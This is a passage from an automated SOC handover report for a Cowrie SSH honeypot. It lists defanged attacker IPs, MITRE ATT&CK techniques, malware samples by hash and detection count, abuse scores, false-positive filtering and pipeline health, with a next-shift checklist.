| `103.86.180[.]10` | **20** | 2026-06-03 12:18 | 2026-06-03 12:59 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `203.57.70[.]32` | **20** | 2026-06-03 14:03 | 2026-06-03 14:42 | 32m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.96.158[.]238` | **19** | 2026-06-03 12:47 | 2026-06-03 13:10 | 29m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `62.3.56[.]187` | **4** | 2026-06-03 12:51 | 2026-06-03 14:01 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]189` | **4** | 2026-06-03 13:41 | 2026-06-03 13:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]86` | **4** | 2026-06-03 13:42 | 2026-06-03 13:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `13.59.132[.]170` | **3** | 2026-06-03 16:04 | 2026-06-03 16:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | **3** | 2026-06-03 13:39 | 2026-06-03 13:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]187` | **3** | 2026-06-03 13:42 | 2026-06-03 13:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]82` | **3** | 2026-06-03 13:39 | 2026-06-03 13:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.221.150[.]186` | **2** | 2026-06-03 11:22 | 2026-06-03 11:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]212` | **2** | 2026-06-03 15:08 | 2026-06-03 15:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]213` | **2** | 2026-06-03 15:08 | 2026-06-03 15:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.15.236[.]98` | **2** | 2026-06-03 11:12 | 2026-06-03 11:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `39.105.212[.]205` | **2** | 2026-06-03 15:22 | 2026-06-03 15:24 | 2m | 0 | `T1592` | 🟢 LOW |
| `43.159.177[.]40` | **2** | 2026-06-03 11:14 | 2026-06-03 11:21 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `45.70.216[.]245` | **2** | 2026-06-03 14:54 | 2026-06-03 15:08 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `52.186.182[.]85` | **2** | 2026-06-03 14:42 | 2026-06-03 14:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.95[.]172` | 1 | 2026-06-03 14:42 | 2026-06-03 14:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.213.34[.]99` | 1 | 2026-06-03 14:02 | 2026-06-03 14:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.8.209[.]87` | 1 | 2026-06-03 15:00 | 2026-06-03 15:00 | 31s | 0 | `T1592` | 🟢 LOW |
| `114.34.108[.]245` | 1 | 2026-06-03 12:03 | 2026-06-03 12:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.72.109[.]90` | 1 | 2026-06-03 12:51 | 2026-06-03 12:51 | 6s | 0 | `T1592` | 🟢 LOW |
| `118.45.108[.]68` | 1 | 2026-06-03 14:25 | 2026-06-03 14:25 | 14s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]172` | 1 | 2026-06-03 16:45 | 2026-06-03 16:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]97` | 1 | 2026-06-03 14:43 | 2026-06-03 14:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.79[.]11` | 1 | 2026-06-03 14:07 | 2026-06-03 14:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.218[.]244` | 1 | 2026-06-03 11:50 | 2026-06-03 11:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `154.83.197[.]176` | 1 | 2026-06-03 14:05 | 2026-06-03 14:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `159.223.213[.]49` | 1 | 2026-06-03 11:09 | 2026-06-03 11:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `164.152.250[.]192` | 1 | 2026-06-03 11:17 | 2026-06-03 11:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.40.112[.]10` | 1 | 2026-06-03 14:59 | 2026-06-03 14:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.215.169[.]153` | 1 | 2026-06-03 13:10 | 2026-06-03 13:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.104[.]44` | 1 | 2026-06-03 16:41 | 2026-06-03 16:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]131` | 1 | 2026-06-03 16:24 | 2026-06-03 16:24 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]173` | 1 | 2026-06-03 16:27 | 2026-06-03 16:27 | 1s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]93` | 1 | 2026-06-03 16:24 | 2026-06-03 16:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.127.185[.]37` | 1 | 2026-06-03 14:29 | 2026-06-03 14:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `204.76.203[.]214` | 1 | 2026-06-03 15:08 | 2026-06-03 15:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]221` | 1 | 2026-06-03 15:08 | 2026-06-03 15:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.189.25[.]100` | 1 | 2026-06-03 16:24 | 2026-06-03 16:24 | 5s | 0 | `T1592` | 🟢 LOW |
| `211.25.241[.]153` | 1 | 2026-06-03 15:49 | 2026-06-03 15:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.128.75[.]174` | 1 | 2026-06-03 14:50 | 2026-06-03 14:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.132.190[.]60` | 1 | 2026-06-03 11:43 | 2026-06-03 11:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `27.78.70[.]85` | 1 | 2026-06-03 14:47 | 2026-06-03 14:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.222.132[.]244` | 1 | 2026-06-03 12:06 | 2026-06-03 12:06 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]202` | 1 | 2026-06-03 14:09 | 2026-06-03 14:09 | 3s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]207` | 1 | 2026-06-03 14:09 | 2026-06-03 14:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]249` | 1 | 2026-06-03 14:12 | 2026-06-03 14:12 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `204.76.203[.]212` | NL | Intelligence Hosting LLC | **100** ⚠️ | 50 |
| `223.123.124[.]120` | PK | CMPak Limited | **100** ⚠️ | 8 |
| `39.105.212[.]205` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `113.8.209[.]87` | CN | China Unicom Heilongjiang Province Network | **100** ⚠️ | 0 |
| `14.103.79[.]11` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `203.57.70[.]32` | CN | CHINANET FUJIAN PROVINCE NETWORK | **100** ⚠️ | 3 |
| `94.231.206[.]249` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `211.25.241[.]153` | MY | TT DOTCOM SDN BHD | **100** ⚠️ | 5 |
| `195.184.76[.]131` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `102.213.34[.]99` | AO | NETSPACE -SERVICOS DE TELECOMUNICACOES, LDA | **100** ⚠️ | 37 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 576 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 387 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 159 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 31 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |

---

## 🔕 False Positive Summary (317 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 18 |
| AbuseIPDB score 23 below threshold 25 | 7 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 288 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 691 cases |
| Tool 34  | Credential Extractor        | ✅ 546 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 317 filtered (45.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 159 priority case(s) shown individually · 52 recon entry/entries in table (21 group(s) consolidating 184 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-03T16:56:39Z_
